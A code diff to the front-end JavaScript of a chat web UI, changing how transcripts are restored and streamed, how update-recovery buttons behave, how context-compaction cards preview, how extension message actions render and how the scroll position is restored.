+  else if(typeof _settledTranscriptOwnsLiveTurn==='function'
+          &&_settledTranscriptOwnsLiveTurn(sid, restored)){
+    inflight.liveTurnHtml=null;
+    return false;
+  }
   else inner.appendChild(restored);
   // Transparent Stream: liveTurnHtml is restored via template.innerHTML, which
   // drops the property-bound onclick/onkeydown handlers wired by
@@ -9747,6 +11181,11 @@ function restoreLiveTurnHtmlForSession(sid){
   const liveGroup=restored.querySelector('.tool-call-group[data-live-tool-call-group="1"]');
   if(liveGroup&&typeof _startActivityElapsedTimer==='function') _startActivityElapsedTimer(liveGroup);
   if(typeof placeLiveToolCardsHost==='function') placeLiveToolCardsHost();
+  try{
+  if(typeof highlightCode==='function') highlightCode(restored);
+  if(typeof addCopyButtons==='function') addCopyButtons(restored);
+  if(typeof initTreeViews==='function') initTreeViews(restored);
+  }catch(_){ /* fail-safe: a bad block (e.g. _buildTreeDOM overflow) must not abort scroll restore, cache or the caller; the deferred pass keeps the old contained failure */ }
   requestAnimationFrame(()=>_postProcessWithAnchorSuppression(restored));
   return true;
 }
@@ -9980,8 +11419,13 @@ async function refreshSession() {
   dismissReconnect();
   if (!S.session) return;
   try {
-    const data = await api(`/api/session?session_id=${encodeURIComponent(S.session.session_id)}`);
+    // Bounded tail (msg_limit=30) — a bare reload used to pull and re-redact
+    // the ENTIRE transcript on every offline/bfcache recovery (#7310/#7625).
+    // truncation signal + _oldestIdx are read below, so the Load-earlier
+    // paging gate still works after the windowed refresh.
+    const data = await api(`/api/session?session_id=${encodeURIComponent(S.session.session_id)}&messages=1&resolve_model=0&msg_limit=30&expand_renderable=1`);
     S.session = data.session;
+    if(typeof _adoptRegenerationRevision==='function') _adoptRegenerationRevision(data.session);
     S.messages = data.session.messages || [];
     _messagesTruncated = !!data.session._messages_truncated;
     _oldestIdx = data.session._messages_offset || 0;
@@ -10007,7 +11451,8 @@ function _formatUpdateTargetStatus(label,info){
 }
 function _formatManualUpdateInstruction(info){
   if(!(info&&info.no_git&&info.manual_update&&info.behind>0)) return null;
-  return t('settings_update_manual_docker','docker pull ghcr.io/nesquena/hermes-webui:latest');
+  const tag=info.channel==='experimental'?'experimental':'latest';
+  return t('settings_update_manual_docker',`docker pull ghcr.io/nesquena/hermes-webui:${tag}`);
 }
 function _formatUpdateCheckError(label,info){
   if(!info||!info.error) return null;
@@ -10308,7 +11753,7 @@ function _renderUpdateWhatsNewLinks(data){
   }
   _appendUpdateDiffLinks(container,targets,"What's new: ");
 }
-function _showUpdateBanner(data){
+function _showUpdateBanner(data,recoveryGenerationAtCheck=null){
   const parts=[];
   const webuiPart=_formatUpdateTargetStatus('WebUI',data.webui);
   const agentPart=_formatUpdateTargetStatus('Agent',data.agent);
@@ -10324,10 +11769,21 @@ function _showUpdateBanner(data){
     btnApply.disabled=!hasApplyTargets;
     btnApply.style.display=hasApplyTargets?'':'none';
     if(webuiManual){
+      // Keep an Agent recovery button only while the fresh check still shows
+      // the condition it recovers from. A check that positively reports the
+      // condition gone (recovery.force / recovery.clear_lock === false) clears
+      // the stale button so a destructive force update cannot linger after the
+      // conflict was resolved outside the UI (Greptile P1 on #8040). Probes
+      // that could not determine the state stay null and never clear. Cached
+      // results also never clear buttons armed after that cache was recorded.
+      const _agentRecovery=(data&&data.agent&&data.agent.recovery)||null;
+      const _currentRecoveryGeneration=Number(window._updateRecoveryGeneration)||0;
+      const _recoveryGenerationIsCurrent=recoveryGenerationAtCheck===null||Number(recoveryGenerationAtCheck)===_currentRecoveryGeneration;
+      const _recoveryGone=(kind)=>!!(!data.cached&&_recoveryGenerationIsCurrent&&_agentRecovery&&_agentRecovery[kind]===false);
       const forceBtn=$('btnForceUpdate');
-      if(forceBtn){forceBtn.disabled=true;forceBtn.style.display='none';forceBtn.dataset.target='';}
+      if(forceBtn&&!(agentUpdatable&&forceBtn.dataset.target==='agent'&&!_recoveryGone('force'))){forceBtn.disabled=true;forceBtn.style.display='none';forceBtn.dataset.target='';}
       const clearLockBtn=$('btnClearUpdateLock');
-      if(clearLockBtn){clearLockBtn.disabled=true;clearLockBtn.style.display='none';clearLockBtn.dataset.target='';}
+      if(clearLockBtn&&!(agentUpdatable&&clearLockBtn.dataset.target==='agent'&&!_recoveryGone('clear_lock'))){clearLockBtn.disabled=true;clearLockBtn.style.display='none';clearLockBtn.dataset.target='';}
     }
   }
   if(!parts.length){
@@ -10444,6 +11900,9 @@ function _showUpdateError(target,res){
   } else {
     showToast(msg);
   }
+  if(res.conflict||res.diverged||res.lock_conflict){
+    window._updateRecoveryGeneration=(Number(window._updateRecoveryGeneration)||0)+1;
+  }
   // Show "Force update" button ONLY for errors recoverable by a destructive
   // hard reset. Lock-only failures are routed to a separate non-destructive
   // "Clear lock and retry update" button (BRICK-2 fix for PR #5688: a lock
@@ -10451,6 +11910,7 @@ function _showUpdateError(target,res){
   // modifications).
   if(forceBtn&&(res.conflict||res.diverged)){
     forceBtn.dataset.target=target;
+    forceBtn.disabled=false;
     forceBtn.style.display='inline-block';
   }
   // Show "Clear lock and retry update" when the only failure was a stale
@@ -10459,6 +11919,7 @@ function _showUpdateError(target,res){
   const clearLockBtn=$('btnClearUpdateLock');
   if(clearLockBtn&&res.lock_conflict){
     clearLockBtn.dataset.target=target;
+    clearLockBtn.disabled=false;
     clearLockBtn.style.display='inline-block';
   }
 }
@@ -10825,14 +12286,14 @@ function _activeTurnTokenMatches(msg, session){
  * same text twice in a row (a plain "继续" follow-up) legitimately gets two
  * identical user turns, and matching on text would swallow the new one. The
  * discriminator is therefore exact identity, never proximity: the active turn's
- * row either carries the server-stamped `_active_turn_token` (stream_id +
- * started_at — unique to this turn), or its timestamp equals `pending_started_at`
- * within a precision-only epsilon that absorbs float/state.db drift but never a
- * full second. A whole-second (or sub-second) mismatch is ambiguous and returns
- * null so the caller materializes the pending turn — the transient duplicate is
- * harmless, hiding a turn + moving its attachments is not. Text equality is
- * still required downstream, so a false match needs identical text AND an exact
- * identity signal.
+ * public row carries `_active_turn_user`, while private rows carry the server-
+ * stamped `_active_turn_token` (stream_id + started_at — unique to this turn),
+ * or their timestamp equals `pending_started_at` within a precision-only epsilon
+ * that absorbs float/state.db drift but never a full second. A whole-second (or
+ * sub-second) mismatch is ambiguous and returns null so the caller materializes
+ * the pending turn — the transient duplicate is harmless, hiding a turn + moving
+ * its attachments is not. Text equality is still required downstream, so a false
+ * match needs identical text AND an exact identity signal.
  */
 function _pendingActiveTurnUserMessage(messages, session){
   const startedAt=Number(session?.pending_started_at);
@@ -10842,6 +12303,8 @@ function _pendingActiveTurnUserMessage(messages, session){
     const msg=list[i];
     if(!msg||String(msg.role||'')!=='user') continue;
     if(typeof _isContextCompactionMessage==='function'&&_isContextCompactionMessage(msg)) continue;
+    // Public projections replace the private token with this authoritative marker.
+    if(msg._active_turn_user===true) return msg;
     // Unambiguous: the row carries the active turn's exact token
     // (stream_id + started_at) stamped by the server's eager-checkpoint path.
     if(typeof _activeTurnTokenMatches==='function'&&_activeTurnTokenMatches(msg,session)) return msg;
@@ -11235,6 +12698,15 @@ function _assistantMessageBelongsInWorklog(m, rawIdx, toolCallAssistantIdxs, vis
   const isTurnFinalAssistant=!!(opts&&opts.isTurnFinalAssistant);
   const visibleText=String(visibleContent!==undefined?visibleContent:msgContent(m)||'').trim();
   const hasVisibleText=!!visibleText&&!_isAssistantEmptyPlaceholderContent(m, visibleText);
+  // The caller only consults this predicate once the turn has settled (it gates
+  // on `!S.busy`), so an `_live` marker seen here is a leftover of the
+  // live-snapshot projection, not an ongoing stream. Folding on it hid the turn's
+  // final answer inline and echoed it into the Worklog, leaving the turn with no
+  // visible content until the #3875 blank-turn fail-safe revealed both copies. A
+  // turn-final assistant message with visible text is the answer, so keep it out
+  // of the fold; every other `_live` message folds as before. Kept as a separate
+  // guard so the live rule below keeps its position.
+  if(m._live&&hasVisibleText&&isTurnFinalAssistant) return false;
   if(m._live) return true;
   if(hasVisibleText&&m._anchor_activity_scene) return false;
   if(hasVisibleText&&isTurnFinalAssistant) return false;
@@ -12917,6 +14389,17 @@ function _anchorSceneRowsForRendering(scene, opts){
   const rows=Array.isArray(scene&&scene.activity_rows)?scene.activity_rows:[];
   const settled=!!(opts&&opts.settled);
   const live=!settled;
+  // #6948 follow-up (duplicate assistant answer; #2051): on a SETTLED turn the
+  // assistant segment owns the final answer, so a process_prose row carrying
+  // that same text must not also be rebuilt into the activity scene. The
+  // transparent-stream renderer suppresses it per row
+  // (_anchorSceneTransparentNodeForRow), but the compact-worklog row builder
+  // (_anchorSceneNodeForRow) has no such guard and renders the row as a second
+  // .assistant-segment above the settled one. Drop it here — the single place
+  // BOTH settled renderers (and the #5839 deferred-rows path) get their rows.
+  // LIVE rendering is untouched: while streaming, the inline live segment is
+  // hidden and the prose row IS the visible answer.
+  const settledFinalAnswer=settled?String((scene&&scene.final_answer)||'').trim():'';
   const out=[];
   const byKey=new Map();
   const liveProseTextKeys=new Map();
@@ -12939,6 +14422,9 @@ function _anchorSceneRowsForRendering(scene, opts){
     if(_anchorSceneIsSettledSuccessfulCompression(row,settled)) continue;
     const text=String(row.text||'').trim();
     if((row.role==='prose'||row.role==='thinking')&&!text) continue;
+    if(settledFinalAnswer&&row.role==='prose'
+       &&typeof _anchorSceneProseDuplicatesFinalAnswer==='function'
+       &&_anchorSceneProseDuplicatesFinalAnswer(text,settledFinalAnswer)) continue; // #6948 follow-up
     const key=keyFor(row);
     if(byKey.has(key)){
       const index=byKey.get(key);
@@ -13212,6 +14698,26 @@ function _anchorSceneProseMatchesFinalAnswer(proseText, finalAnswer){
   if(!(a.startsWith(b)||b.startsWith(a))) return false;
   const shorter=Math.min(a.length,b.length), longer=Math.max(a.length,b.length);
   return shorter>=80 && (shorter/longer)>=0.9;
+}
+// #6948 follow-up (duplicate assistant answer; #2051): the same near-equality
+// test as _anchorSceneProseMatchesFinalAnswer, minus its absolute `shorter>=80`
+// floor. That floor makes the matcher a no-op for every SHORT final answer
+// (greetings, "Done.", one-liners), so a prose row that is the answer minus its
+// last streamed token — e.g. "Hey! What can I help you with today" vs
+// "...today?" — was rebuilt as a SECOND assistant-segment beside the settled
+// one. The >=0.9 length ratio is what actually keeps a distinct short
+// intermediate sentence from being swallowed by a long final answer (Codex
+// #4568), so it alone is kept. Deliberately a separate helper: the per-row
+// render-time matcher above, and the tests pinning its exact predicate, stay
+// untouched.
+function _anchorSceneProseDuplicatesFinalAnswer(proseText, finalAnswer){
+  if(_anchorSceneProseMatchesFinalAnswer(proseText,finalAnswer)) return true;
+  const norm=(s)=>String(s||'').replace(/\s+/g,' ').trim();
+  const a=norm(proseText), b=norm(finalAnswer);
+  if(!a||!b) return false;
+  if(!(a.startsWith(b)||b.startsWith(a))) return false;
+  const shorter=Math.min(a.length,b.length), longer=Math.max(a.length,b.length);
+  return (shorter/longer)>=0.9;
 }
 function _anchorSceneWorklogGroup(blocks, opts){
   if(!blocks) return null;
@@ -13748,6 +15254,10 @@ function _refreshTransparentThinkingLiveRow(existing, node){
   return true;
 }
 
+const _TRANSPARENT_FADE_BLOCK_TAGS = new Set([
+  'P','DIV','H1','H2','H3','H4','H5','H6','BLOCKQUOTE','LI','UL','OL','PRE','TABLE',
+]);
+
 function _bindTransparentFadeCleanup(body){
   if(!body || body._transparentFadeCleanupBound || typeof body.addEventListener !== 'function') return;
   body._transparentFadeCleanupBound = true;
@@ -13762,6 +15272,20 @@ function _bindTransparentFadeCleanup(body){
     span.classList.remove('is-new');
     if(span.style) span.style.removeProperty('--stream-fade-ms');
   });
+}
+
+// Trailing block element of a live prose body, if any. Live rows are produced
+// by the incremental streaming-markdown path, which keeps an open block (a <p>)
+// as it parses; text appended as a sibling of that block would render on its
+// own line. Inline wrappers (fade spans) are not block boxes and are skipped.
+function _transparentFadeAppendTarget(body){
+  if(!body) return body;
+  const kids = body.childNodes;
+  if(!kids || !kids.length) return body;
+  const last = kids[kids.length - 1];
+  if(!last || last.nodeType !== 1) return body;
+  const tag = String(last.tagName || '').toUpperCase();
+  return _TRANSPARENT_FADE_BLOCK_TAGS.has(tag) ? last : body;
 }
 
 function _appendTransparentFadeText(body, text){
@@ -13789,13 +15313,58 @@ function _appendTransparentFadeText(body, text){
   }
   if(!changed) frag.appendChild(document.createTextNode(value));
   else if(last < value.length) frag.appendChild(document.createTextNode(value.slice(last)));
-  body.appendChild(frag);
+  // Append inside the trailing block element (the streaming markdown parser's
+  // open <p>) rather than at the root of .msg-body. A block sibling would start
+  // its own line box, so a continuation of the current sentence — in particular
+  // the tail of a word — must land inside that block to stay on the same line.
+  _transparentFadeAppendTarget(body).appendChild(frag);
 }
 
 function _refreshTransparentFadeProseRow(existing, node, preservedState){
+  if(!existing || !node) return node || existing;
+  if(existing === node) return existing;
   let body = existing.querySelector ? existing.querySelector('.msg-body') : null;
   const nextText = String((node.dataset && node.dataset.rawText) || (node.textContent || ''));
-  const currentText = String(existing.getAttribute('data-stream-fade-text') || (body && body.textContent) || '');
+  // Resume strictly from the source-space cursor. `body.textContent` is NOT a
+  // valid substitute: rows built by the incremental streaming-markdown path
+  // render one character behind their source text (the parser holds the last
+  // character pending), so falling back to rendered text yields a delta that
+  // starts mid-word and tears the word in half. With no cursor we cannot know
+  // how much of the source is already rendered, so rebuild the body instead of
+  // guessing a delta.
+  const hasCursor = !!(existing.getAttribute && existing.getAttribute('data-stream-fade-text') !== null);
+  const currentText = hasCursor ? String(existing.getAttribute('data-stream-fade-text') || '') : '';
+  const candidateBody = node.querySelector ? node.querySelector('.msg-body') : null;
+  const parserOwned = !!(candidateBody && candidateBody !== body && candidateBody.__smdParser);
+  const mute = (typeof window !== 'undefined' && typeof window.__streamFadeMuteRenderedPrefix === 'function')
+    ? window.__streamFadeMuteRenderedPrefix
+    : null;
+  if(parserOwned){
+    // Promote the actual parser-owned candidate into the keyed row's DOM
+    // position once. Cloning its children into the old visible row on every
+    // later growth frame cuts off the previous tail word's ~620ms fade
+    // (`.is-new` is stripped from the replacement) and breaks word-node
+    // identity used for scroll-anchor stability. After this swap, later
+    // keyed renders hit `_refreshTransparentLiveRow(existing === node)` and
+    // keep growing the same parser target. Pending and MEDIA tails stay on
+    // the parser until it flushes them.
+    const prevRendered = String((body && body.textContent) || '');
+    if(candidateBody.classList) candidateBody.classList.add('stream-fade-active');
+    _bindTransparentFadeCleanup(candidateBody);
+    if(mute && prevRendered) mute(candidateBody, prevRendered);
+    if(node.removeAttribute) node.removeAttribute('data-stream-fade-text');
+    const parent = existing.parentNode || existing.parentElement || null;
+    if(parent && existing.parentNode === parent){
+      if(typeof parent.replaceChild === 'function'){
+        parent.replaceChild(node, existing);
+      }else if(typeof parent.insertBefore === 'function'){
+        parent.insertBefore(node, existing);
+        if(typeof existing.remove === 'function') existing.remove();
+      }
+    }
+    _rehydrateTransparentLiveRow(node, existing, preservedState);
+    return node;
+  }
   const pairs = _transparentLiveRowAttributePairs(node);
   const kept = Object.create(null);
   for(const pair of pairs){
@@ -13816,14 +15385,42 @@ function _refreshTransparentFadeProseRow(existing, node, preservedState){
     existing.appendChild(body);
   }
   if(body.classList) body.classList.add('stream-fade-active');
-  if(!nextText.startsWith(currentText)){
-    body.textContent = '';
+  if(!hasCursor || !nextText.startsWith(currentText)){
+    // Rebuild branch. Snapshot the rendered text BEFORE clearing (#7082
+    // review should-fix): without it every word re-wraps as `.is-new`, the
+    // whole visible row dips to opacity 0 and fades back (~620ms), and the
+    // wholesale node replacement invites the one-time scroll-anchor bounce
+    // the #6257 comment in `_bindTransparentFadeCleanup` warns about.
+    const prevRendered = String(body.textContent || '');
     existing.setAttribute('data-stream-fade-text', '');
-    _appendTransparentFadeText(body, nextText);
+    // Non-parser candidates may still carry a parsed-looking body (tests and
+    // rewind rebuilds). Clone that DOM when present so we do not flatten it
+    // back to literal source.
+    let resumeCursor = nextText;
+    if(candidateBody && candidateBody !== body &&
+       typeof candidateBody.cloneNode === 'function' &&
+       candidateBody.childNodes && candidateBody.childNodes.length){
+      const clone = candidateBody.cloneNode(true);
+      body.textContent = '';
+      while(clone.childNodes && clone.childNodes.length) body.appendChild(clone.childNodes[0]);
+      _bindTransparentFadeCleanup(body);
+      const renderedNow = String(body.textContent || '');
+      if(renderedNow && nextText.startsWith(renderedNow)) resumeCursor = renderedNow;
+    }else{
+      body.textContent = '';
+      _appendTransparentFadeText(body, nextText);
+    }
+    // messages.js `_streamFadeMuteRenderedPrefix` idiom (exported on window the
+    // same way `__anchorProseIncrementalNode` is): rendered-space compare of the
+    // pre-rebuild snapshot against the rebuilt body, stripping `.is-new` from
+    // spans inside the common prefix so already-visible words do not replay
+    // their fade — only genuinely-new tail words animate.
+    if(mute && prevRendered) mute(body, prevRendered);
+    existing.setAttribute('data-stream-fade-text', resumeCursor);
   }else{
     _appendTransparentFadeText(body, nextText.slice(currentText.length));
+    existing.setAttribute('data-stream-fade-text', nextText);
   }
-  existing.setAttribute('data-stream-fade-text', nextText);
   _rehydrateTransparentLiveRow(existing, node, preservedState);
   return existing;
 }
@@ -14963,6 +16560,22 @@ function _isContextCompactionMessage(m){
 function _isContextCompactionText(text){
   return /^\s*\[context compaction/i.test(String(text||'')) || /^\s*context compaction/i.test(String(text||''));
 }
+function _compactionSummarySegment(text){
+  // Mirror of api/compression_anchor.py compaction_summary_segment(). The
+  // replay patch carries this helper so it stays self-contained on upstream.
+  const s=String(text||'').replace(/^\s+/,'');
+  const low=s.toLowerCase();
+  if(low.startsWith('[context compaction')||low.startsWith('context compaction')) return s;
+  if(!low.startsWith('[prior context')) return null;
+  const delim=low.indexOf('[end of prior context');
+  if(delim===-1) return null;
+  const after=s.slice(delim);
+  const close=after.indexOf(']');
+  if(close===-1) return null;
+  const segment=after.slice(close+1).replace(/^\s+/,'');
+  if(segment.toLowerCase().startsWith('[context compaction')) return segment;
+  return null;
+}
 function _isPreservedCompressionTaskListMarkerText(text){
   return /^\s*\[your active task list was preserved across context compression\]/i.test(String(text||''));
 }
@@ -15042,9 +16655,91 @@ function _latestCompressionReferenceMessage(messages, summaryText=''){
 function _shouldShowSettledCompressionReference(referenceText){
   return !!String(referenceText||'').trim() && !_isContextCompactionText(referenceText);
 }
+// Ultra-compact display (2026-08-18): the compaction marker text starts with a
+// long fixed envelope of handling instructions. The conversation card must
+// preview the DIGEST (goal/state the user cares about), never the envelope.
+function _compactionDigestText(text){
+  const s=String(text||'');
+  // The envelope prose ends right before the first markdown heading on its
+  // own line. Quoted headings inside the envelope (e.g. "from '## Historical
+  // Task Snapshot' or any other section") never sit at line start.
+  const m=s.match(/(^|\n)#{1,3} [^\n]/);
+  if(!m) return s.trim();
+  const start=m.index+(m[1]?1:0);
+  return s.slice(start).trim();
+}
+function _compactionCardPreview(text){
+  const digest=_compactionDigestText(text)
+    .replace(/^#{1,3} /gm,'')
+    .replace(/^Historical Task Snapshot\s*/i,'');
+  return digest.split(/\n+/).map(l=>l.trim()).filter(Boolean).slice(0,2).join(' ').slice(0,220);
+}
+// All compaction markers present in the LOADED transcript, oldest first. Each
+// one renders as its own collapsed card at its real position so the user can
+// see when the context was compacted and reopen the digest inline.
+function _loadedCompactionMarkerRawIdxs(messages){
+  const out=[];
+  if(!Array.isArray(messages)) return out;
+  for(let i=0;i<messages.length;i++){
+    if(_isContextCompactionMessage(messages[i])) out.push(i);
+  }
+  return out;
+}
+// A settled compaction whose marker sits before the server-loaded tail must
+// remain visible at the top of that tail. Anchoring it to an old assistant/tool
+// turn can bury it inside a hidden worklog, which makes compaction look absent.
+// `currentSummaryFallback` is true when the session's current summary matches
+// no loaded marker and therefore renders as its own settled card. That card is
+// the newest compaction the user can see, so it owns the preserved task cards
+// and no marker card may attach them again.
+function _selectCompactionCardPlacements(markerRawIdxs,firstRenderedRawIdx,currentSummaryFallback=false){
+  const preWindowMarkers=[];
+  const inlineMarkers=[];
+  const boundary=Number.isFinite(firstRenderedRawIdx)?firstRenderedRawIdx:-1;
+  for(const value of Array.isArray(markerRawIdxs)?markerRawIdxs:[]){
+    const rawIdx=Number(value);
+    if(!Number.isInteger(rawIdx)||rawIdx<0) continue;
+    if(rawIdx<boundary) preWindowMarkers.push(rawIdx);
+    else inlineMarkers.push(rawIdx);
+  }
+  const taskOwner=currentSummaryFallback
+    ?{kind:'current-summary',rawIdx:-1}
+    :inlineMarkers.length
+      ?{kind:'inline',rawIdx:inlineMarkers[inlineMarkers.length-1]}
+      :!preWindowMarkers.length
+        ?null
+        :{kind:'pre-window',rawIdx:preWindowMarkers[preWindowMarkers.length-1]};
+  return {preWindowMarkers,inlineMarkers,taskOwner};
+}
+function _insertCompactionCardNodes(entries,taskOwner,insertNode){
+  const insertedNodes=[];
+  let taskOwnerNode=null;
+  if(!Array.isArray(entries)||typeof insertNode!=='function') return {insertedNodes,taskOwnerNode};
+  for(const entry of entries){
+    if(!entry?.node) continue;
+    const inserted=insertNode(entry.node,entry.rawIdx,entry.kind)!==false;
+    if(!inserted||!entry.node.parentElement) continue;
+    insertedNodes.push(entry.node);
+    if(taskOwner&&entry.kind===taskOwner.kind&&entry.rawIdx===taskOwner.rawIdx) taskOwnerNode=entry.node;
+  }
+  return {insertedNodes,taskOwnerNode};
+}
+function _insertPreservedCompressionTaskFallback(taskOwnerNode,standaloneNode,insertNode){
+  if(taskOwnerNode?.parentElement||!standaloneNode||typeof insertNode!=='function') return false;
+  return insertNode(standaloneNode)!==false&&!!standaloneNode.parentElement;
+}
+function _pinCompactionCardAtTop(inner,node){
+  if(!inner||!node) return false;
+  inner.appendChild(node);
+  return true;
+}
+function _pinSettledCompressionReferenceAtTop(inner,node,referenceMessageRawIdx){
+  if(referenceMessageRawIdx>=0) return false;
+  return _pinCompactionCardAtTop(inner,node);
+}
 function _compressionReferenceCardHtml(text, open=false){
   const copy=_engineAwareCompressionCopy();
-  const preview=text.split(/\n+/).filter(Boolean).slice(0,2).join(' ');
+  const preview=_compactionCardPreview(text)||text.split(/\n+/).filter(Boolean).slice(0,2).join(' ');
   return `
     <div class="tool-card-row compression-card-row" data-compression-card="1" data-raw-text="${esc(text)}">
       <div class="tool-card tool-card-compress-reference${open?' open':''}">
@@ -15275,6 +16970,114 @@ function clearMessageRenderCache(){
   clearVisibleMessageRowCache();
   _clearMessageVirtualHeightCache();
 }
+
+function _extensionMessageActionContext(slot,includeText){
+  if(!slot||!S.session||!slot.closest) return null;
+  if(slot.closest('[hidden],[aria-hidden="true"],[data-live-assistant="1"]')) return null;
+  const owner=slot.closest('[data-msg-idx][data-session-msg-idx][data-raw-text]');
+  const roleOwner=slot.closest('[data-role]');
+  const role=roleOwner&&roleOwner.dataset?roleOwner.dataset.role:'';
+  if(!owner||(role!=='user'&&role!=='assistant')) return null;
+  const rawIdx=Number(owner.dataset.msgIdx);
+  const messageIndex=Number(owner.dataset.sessionMsgIdx);
+  if(!Number.isSafeInteger(rawIdx)||rawIdx<0||!Number.isSafeInteger(messageIndex)||messageIndex<0) return null;
+  if(_messageSessionIndexForRawIdx(rawIdx)!==messageIndex) return null;
+  const message=S.messages&&S.messages[rawIdx];
+  if(!message||message.role!==role) return null;
+  const context={sessionId:String(S.session.session_id||''),messageIndex,role};
+  if(!context.sessionId) return null;
+  if(includeText) context.text=String(owner.dataset.rawText||'');
+  return context;
+}
+
+function _extensionMessageActionButtonHtml(action,context){
+  const label=esc(String(action.label||''));
+  const pending=action.pending===true;
+  return `<button type="button" class="msg-action-btn extension-msg-action" data-extension-message-action="1" data-extension-id="${esc(String(action.extensionId||''))}" data-extension-action-id="${esc(String(action.id||''))}" data-session-id="${esc(context.sessionId)}" data-message-index="${context.messageIndex}" data-message-role="${context.role}" title="${label}" aria-label="${label}" aria-pressed="${action.pressed===true?'true':'false'}" aria-busy="${pending?'true':'false'}"${pending?' disabled':''} onclick="invokeExtensionMessageAction(this)">${li(action.icon,13)}</button>`;
+}
+
+function _syncExtensionMessageActionSlots(root){
+  const runtime=window.HermesExtensionSettings;
+  if(!runtime||typeof runtime._messageActionsForContext!=='function') return;
+  const scope=root&&typeof root.querySelectorAll==='function'?root:document;
+  // No extension has registered an action (the common case): skip per-row context
+  // resolution and only empty slots still holding buttons from a retired registration.
+  if(typeof runtime._hasMessageActions==='function'&&!runtime._hasMessageActions()){
+    for(const slot of scope.querySelectorAll('[data-extension-message-actions]:not(:empty)')) slot.innerHTML='';
+    return;
+  }
+  for(const slot of scope.querySelectorAll('[data-extension-message-actions]')){
+    const context=_extensionMessageActionContext(slot,false);
+    const actions=context?runtime._messageActionsForContext(context):[];
+    const existing=Array.from(slot.children||[]);
+    const sameActions=existing.length===actions.length&&existing.every((button,index)=>{
+      const action=actions[index];
+      return !!(
+        button&&button.dataset&&action&&
+        button.dataset.extensionId===action.extensionId&&
+        button.dataset.extensionActionId===action.id
+      );
+    });
+    if(sameActions){
+      existing.forEach((button,index)=>{
+        const action=actions[index];
+        const pending=action.pending===true;
+        button.dataset.sessionId=context.sessionId;
+        button.dataset.messageIndex=String(context.messageIndex);
+        button.dataset.messageRole=context.role;
+        button.setAttribute('aria-pressed',action.pressed===true?'true':'false');
+        button.setAttribute('aria-busy',pending?'true':'false');
+        button.disabled=pending;
+      });
+      continue;
+    }
+    const html=actions.map(action=>_extensionMessageActionButtonHtml(action,context)).join('');
+    if(slot.innerHTML!==html) slot.innerHTML=html;
+  }
+}
+
+function invokeExtensionMessageAction(button){
+  if(!button||button.disabled) return false;
+  const slot=button.closest&&button.closest('[data-extension-message-actions]');
+  const context=_extensionMessageActionContext(slot,true);
+  if(!context) return false;
+  if(
+    button.dataset.sessionId!==context.sessionId||
+    Number(button.dataset.messageIndex)!==context.messageIndex||
+    button.dataset.messageRole!==context.role
+  ) return false;
+  const runtime=window.HermesExtensionSettings;
+  if(!runtime||typeof runtime._invokeMessageAction!=='function') return false;
+  return runtime._invokeMessageAction(
+    button.dataset.extensionId,
+    button.dataset.extensionActionId,
+    context,
+    {
+      opener:button,
+      onError(){
+        if(typeof showToast==='function') showToast('Extension message action failed',4000,'error');
+      },
+    }
+  );
+}
+
+let _extensionMessageActionChangeUnsubscribe=null;
+window._bindHermesExtensionMessageActions=function(){
+  if(_extensionMessageActionChangeUnsubscribe) return;
+  const runtime=window.HermesExtensionSettings;
+  if(!runtime||typeof runtime._onMessageActionChange!=='function') return;
+  _extensionMessageActionChangeUnsubscribe=runtime._onMessageActionChange((change)=>{
+    // Only cached transcript HTML can hold stale action buttons. A pending flip is
+    // reconciled in place below (the opener stays connected), so it drops nothing;
+    // other changes drop just the per-session HTML, not the markdown/height caches.
+    if(!change||change.reason!=='pending'){
+      _sessionHtmlCache.clear();
+      _sessionHtmlCacheSid=null;
+    }
+    _syncExtensionMessageActionSlots(document.getElementById('msgInner'));
+  });
+  _syncExtensionMessageActionSlots(document.getElementById('msgInner'));
+};
 
 // #6999: feed a structured payload field's string form through the FNV-1a
 // loop IN FULL, without materializing clipped copies or skipping the middle.
@@ -15802,9 +17605,19 @@ function _abandonMessageScrollSnapshot(){
 function _restorePinnedMessageScrollSnapshot(snapshot){
   const el=$('messages');
   if(!el||!snapshot||snapshot.pinned!==true||snapshot.userUnpinned===true) return false;
+  // Bounce fix (Sep 6 2026): activity-scene rebuilds capture `snapshot.bottom`
+  // (the tail gap) BEFORE the rebuild, then restore the pinned reader AFTER
+  // content has GROWN below. Restoring to maxTop-bottom used the stale
+  // pre-rebuild gap and landed the viewport up to the full growth-delta short
+  // of the tail; the follow writer's snap-to-bottom then landed in a different
+  // paint frame — the reader saw up-then-snap text bounce on every streamed
+  // scene update. A pinned reader follows the live tail by definition, so the
+  // restore target is the POST-rebuild tail (maxTop): idempotent with
+  // _setMessageScrollToBottom(), which runs immediately after. Also removes a
+  // latent pathology: a pathological shrink (stale bottom > new maxTop) used
+  // to clamp the target to scrollTop 0 — a jump to the TOP.
   const maxTop=Math.max(0,el.scrollHeight-el.clientHeight);
-  const bottom=Number(snapshot.bottom);
-  const target=Number.isFinite(bottom)?maxTop-Math.max(0,bottom):maxTop;
+  const target=maxTop;
   _programmaticScroll=true;_programmaticScrollSetAt=performance.now();
   el.scrollTop=Math.max(0,Math.min(target,maxTop));
   // Sync _lastScrollTop after programmatic restore so sticky-unpin does not false-trigger (#1731).
@@ -16065,7 +17878,6 @@ function _restoreMessageScrollSnapshotSameFrame(snapshot){
   }
   if(!restoredViaAnchor){
     const maxTop=Math.max(0,el.scrollHeight-el.clientHeight);
-    const bottom=Number(snapshot.bottom);
     // Mobile/touch viewports have native overflow anchoring to hold an
     // unpinned reader across a rebuild. Desktop deliberately disables that
     // browser behavior, so it must continue into the explicit fallback below.
@@ -16086,8 +17898,14 @@ function _restoreMessageScrollSnapshotSameFrame(snapshot){
       _nearBottomCount=0;
       return;
     }
-    const target=(snapshot.pinned===true&&Number.isFinite(bottom))
-      ? maxTop-Math.max(0,bottom)
+    // Bounce fix (Sep 6 2026): same post-rebuild tail as
+    // _restorePinnedMessageScrollSnapshot — the pre-rebuild `bottom` gap is
+    // stale once the rebuild grew content, so restoring to maxTop-bottom
+    // landed short of the tail and raced the follow writer's bottom snap
+    // across paint frames (visible up-then-snap bounce mid-stream). A pinned
+    // reader follows the live tail; target the tail exactly.
+    const target=(snapshot.pinned===true)
+      ? maxTop
       : Number(snapshot.top)||0;
     // Streaming stale-snapshot guard (issue #5637). The userUnpinned check above is
     // defeated when a live stream re-pins the state machine (a scrollHeight-collapse
@@ -16499,8 +18317,27 @@ function _processWakeupCardHtml(info, rawText, extras){
